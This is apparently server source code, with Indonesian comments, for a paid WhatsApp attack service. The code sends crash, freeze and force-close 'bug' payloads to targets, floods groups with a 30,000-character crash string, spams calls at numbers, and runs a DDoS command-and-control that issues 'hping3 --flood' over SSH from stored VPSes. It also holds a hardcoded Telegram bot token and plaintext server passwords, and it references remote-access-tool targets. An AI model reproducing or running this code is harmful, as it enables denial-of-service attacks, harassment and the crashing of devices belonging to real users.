const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

// ── STARTUP: Generate pairId untuk semua user yang belum punya ───────────────
(function generateAllPairIds() {
  try {
    const db = loadDatabase();
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) {
        db[i].pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
      }
    }
    if (changed) {
      saveDatabase(db);
      console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch(e) {
    console.error('[STARTUP] pairId generation error:', e.message);
  }
})();



process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    getContentType,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "forclose", bug_name: "[ Ⓧ FORCLOSE ANDRO 𝓣 ]" },
  { bug_id: "crash", bug_name: "[ Ⓧ CRASH ONE MSG 𝓣 ]" },
  { bug_id: "blank", bug_name: "[ Ⓧ BLANK STUCK 𝓣 ]" },
  { bug_id: "freze", bug_name: "[ Ⓧ FREZE CHAT MSG 𝓣 ]" },
  { bug_id: "delay", bug_name: "[ Ⓧ DELAY HARD 𝓣 ]" },
  { bug_id: "BLANK", bug_name: "Ⓧ BLANK CLICK 𝓣" },
  { bug_id: "delayv1", bug_name: "[ Ⓧ DELAY V1 𝓣 ]" },
  { bug_id: "delayhard", bug_name: "[ Ⓧ DELAY HARD V2 𝓣 ]" },
  { bug_id: "force", bug_name: "[ Ⓧ FORCE CLOSE 𝓣 ]" },
  { bug_id: "fcno", bug_name: "[ Ⓧ FC NO RECOVER 𝓣 ]" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8924870886:AAF9WakqQmP1tdVFSryAQcKjRJh1Kav9QOw"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

// 🔐 ID Telegram utama developer/owner. Ganti ke ID kamu sendiri.
// User dengan ID ini bisa akses SEMUA command bot Telegram & endpoint owner.
const OWNER_ID = 1677459127;

// Daftar developer tambahan (kalau mau tambah admin Telegram lain).
// Default cuma berisi OWNER_ID. Edit manual kalau mau tambah.
const DEV_IDS = new Set([OWNER_ID]);
function isDeveloper(userId) {
  return DEV_IDS.has(Number(userId));
}
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};  // in-memory live frames

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }


const PORT = 1301;

// Single server listen (HTTP + WebSocket pada port yang sama)
server.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://indonesiajaya.omhc.my.id${PORT}`);
  startUserSessions();
});




app.use(express.urlencoded({ extended: false, limit: '15mb' }));
app.use(express.json({ limit: '15mb' }));
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  // APK expects: { servers: [...] }
  res.json({ valid: true, servers: userVPS });
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}


function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// GROUP BUG ENDPOINT — /groupBug
// ═══════════════════════════════════════════════════════════════════════════
//
// Kirim bug ke grup WhatsApp lewat invite link.
//
// Query params:
//   key  — session key user
//   link — invite link grup (https://chat.whatsapp.com/xxxxxxxxxxxx)
//   bug  — jenis bug: forclose | crash | blank | freze | delay | BLANK
//
// Alur:
// 1. Validasi key, link, dan role (VIP+ only)
// 2. Cek cooldown (sama kayak /sendBug, role-based)
// 3. Respond duluan {valid: true, sended: true} biar UI gak timeout
// 4. Background: cari sender aktif (private/global), join grup, kirim bug
//    payload sesuai jenis, leave grup setelah selesai
//
// Bug payloads (sama kayak contact bug, tapi target = groupJid):
//   forclose → OmhcCrashAlbum + QQSFreezeeChat + locfrz + NgelayV2
//   crash    → QQSFreezeeChat + OmhcCrashAlbum + WizzCrash + NgelayV2
//   blank    → QQSFreezeeChat + OmhcCrashAlbum + WizzCrash + NgelayV2
//   freze    → QQSFreezeeChat + OmhcCrashAlbum + FrezeChat + NgelayV2
//   delay    → NgelayV2 + Omhcharddelay + dongo
//   BLANK    → QQSFreezeeChat + OmhcCrashAlbum + k + NgelayV2
// ═══════════════════════════════════════════════════════════════════════════

const groupBugCooldowns = {}; // { username: timestamp }


// ========== NEW BUG GROUP SYSTEM ==========

// ========== BUG GROUP SYSTEM (SEDERHANA) ==========

// ========== BUG GROUP SYSTEM (AUTO CONVERT LINK → ID) ==========

// ========== BUG GROUP SYSTEM (PAKAI GRUP YANG SUDAH JOIN) ==========

// ========== BUG GROUP SYSTEM (JOIN + SEND + LEAVE) ==========

// GET /bugGroupSystems — list semua bug type
app.get("/bugGroupSystems", (req, res) => {
    const bugSystems = bugs.map(b => ({
        id: b.bug_id,
        name: b.bug_name,
        description: `${b.bug_name} - Group Attack`,
        icon: "🐛",
        count: 0,
        delay: 0
    }));
    res.json({ valid: true, bugSystems });
});

// GET /myGroup — ambil daftar grup yang diikuti
app.get("/myGroup", async (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });

    const sockEntries = Object.entries(activeConnections);
    if (sockEntries.length === 0) {
        return res.json({ valid: true, groups: [] });
    }

    const sock = sockEntries[0][1];
    try {
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups).map(g => ({
            id: g.id,
            name: g.subject || "Unknown Group",
            avatar: g?.profilePictureUrl || "",
            memberCount: g.participants?.length || 0,
            joined: true
        }));
        res.json({ valid: true, groups: groupList });
    } catch (e) {
        console.error("[myGroup] Error:", e.message);
        res.json({ valid: true, groups: [] });
    }
});

// 🔥 FUNGSI: Join grup + dapatkan JID
async function joinGroupAndGetJid(sock, linkOrJid) {
    // Cek apakah sudah JID
    if (linkOrJid.includes("@g.us")) {
        return linkOrJid;
    }
    
    // Extract invite code dari link
    const inviteRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const match = linkOrJid.match(inviteRegex);
    
    if (!match) {
        return linkOrJid.includes("@g.us") ? linkOrJid : linkOrJid + "@g.us";
    }
    
    const inviteCode = match[1];
    console.log(`[joinGroup] Invite code: ${inviteCode}`);
    
    try {
        // Coba dapatkan info grup
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        console.log(`[joinGroup] Group info: ${groupInfo.id} - ${groupInfo.subject}`);
        
        // Coba join grup
        try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[joinGroup] ✅ Successfully joined: ${groupInfo.id}`);
            await sleep(2000);
            return groupInfo.id;
        } catch (joinErr) {
            console.warn(`[joinGroup] Join error: ${joinErr.message}`);
            
            // Kalau udah member, return JID
            if (joinErr.message && (joinErr.message.includes('already') || joinErr.message.includes('member'))) {
                console.log(`[joinGroup] Already a member, using JID: ${groupInfo.id}`);
                return groupInfo.id;
            }
            
            // Kalau error "account_reachout_restricted" → coba pakai sender lain
            if (joinErr.message && joinErr.message.includes('account_reachout_restricted')) {
                console.log(`[joinGroup] ❌ Sender restricted from joining groups`);
                throw new Error('ACCOUNT_RESTRICTED: Sender tidak bisa join grup');
            }
            
            throw joinErr;
        }
    } catch (err) {
        console.error(`[joinGroup] Failed: ${err.message}`);
        throw err;
    }
}

// POST /joinGroup — join grup via link
app.post("/joinGroup", async (req, res) => {
    const { key, groupInput } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });

    const sockEntries = Object.entries(activeConnections);
    if (sockEntries.length === 0) {
        return res.status(400).json({ valid: false, success: false, message: "No active sender" });
    }
    const sock = sockEntries[0][1];

    try {
        const groupJid = await joinGroupAndGetJid(sock, groupInput);
        
        const metadata = await sock.groupMetadata(groupJid);
        res.json({ 
            valid: true, 
            success: true, 
            message: `Joined group: ${metadata.subject}`,
            groupJid: groupJid,
            groupName: metadata.subject,
            memberCount: metadata.participants?.length || 0
        });
    } catch (e) {
        console.error("[joinGroup] Error:", e.message);
        res.json({ valid: false, success: false, message: e.message });
    }
});

// GET /sendBugGroup — kirim bug ke grup (JOIN + SEND + LEAVE)
app.get("/sendBugGroup", async (req, res) => {
    const { key, group, bugType } = req.query;
    
    console.log(`[sendBugGroup] Request: bug=${bugType}, group=${group}`);
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.json({ valid: false, message: "User not found" });

    // Role check
    const role = user.role || "member";
    const allowedRoles = ['vip', 'owner', 'founder', 'dev', 'high owner', 'high admin', 'moderator', 'seles', 'reseller'];
    if (!allowedRoles.includes(role.toLowerCase())) {
        return res.json({ valid: false, message: "Group bug hanya untuk VIP+" });
    }

    // Cooldown check
    const cooldownSeconds = roleCooldowns[role] ?? 10;
    if (!user.lastSend) user.lastSend = 0;
    const now = Date.now();
    const diffSeconds = Math.floor((now - user.lastSend) / 1000);
    if (cooldownSeconds > 0 && diffSeconds < cooldownSeconds) {
        return res.json({
            valid: true, sended: false,
            cooldown: true, wait: cooldownSeconds - diffSeconds,
        });
    }
    user.lastSend = now;
    saveDatabase(db);

    const bug = bugs.find(b => b.bug_id === bugType);
    if (!bug) {
        return res.json({ valid: false, sended: false, message: "Bug type not found" });
    }

    // 🔥 CARI SENDER AKTIF
    let sock = null;
    let senderSource = 'none';
    
    const sockEntries = Object.entries(activeConnections);
    if (sockEntries.length === 0) {
        return res.json({ valid: false, sended: false, message: "No active sender" });
    }
    
    // Coba cari sender yang bisa join grup
    for (const [name, s] of sockEntries) {
        try {
            // Test apakah sender bisa join
            const testInfo = await s.groupGetInviteInfo(group.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)?.[1] || '');
            if (testInfo) {
                sock = s;
                senderSource = name;
                console.log(`[sendBugGroup] Using sender: ${name}`);
                break;
            }
        } catch (_) {
            continue;
        }
    }
    
    // Fallback ke sender pertama
    if (!sock) {
        sock = sockEntries[0][1];
        senderSource = sockEntries[0][0];
        console.log(`[sendBugGroup] Using fallback sender: ${senderSource}`);
    }

    // ═══ RESPONSE DULUAN ═══
    res.json({ valid: true, sended: true, cooldown: false, role, bug: bugType });

    // ═══ BACKGROUND PROCESS ═══
    setImmediate(async () => {
        let targetJid = null;
        let joined = false;
        
        try {
            // 🔥 STEP 1: JOIN GRUP
            const inviteRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
            const match = group.match(inviteRegex);
            
            if (match) {
                const inviteCode = match[1];
                console.log(`[sendBugGroup] Invite code: ${inviteCode}`);
                
                try {
                    // Dapatkan info grup
                    const groupInfo = await sock.groupGetInviteInfo(inviteCode);
                    targetJid = groupInfo.id;
                    console.log(`[sendBugGroup] Group: ${targetJid} - ${groupInfo.subject}`);
                    
                    // Join grup
                    try {
                        await sock.groupAcceptInvite(inviteCode);
                        joined = true;
                        console.log(`[sendBugGroup] ✅ Joined: ${targetJid}`);
                        await sleep(2000);
                    } catch (joinErr) {
                        if (joinErr.message && (joinErr.message.includes('already') || joinErr.message.includes('member'))) {
                            joined = true;
                            console.log(`[sendBugGroup] Already a member: ${targetJid}`);
                        } else if (joinErr.message && joinErr.message.includes('account_reachout_restricted')) {
                            console.log(`[sendBugGroup] ❌ Sender restricted. Mencoba sender lain...`);
                            
                            // Coba sender lain
                            for (const [name, s] of sockEntries) {
                                if (s === sock) continue;
                                try {
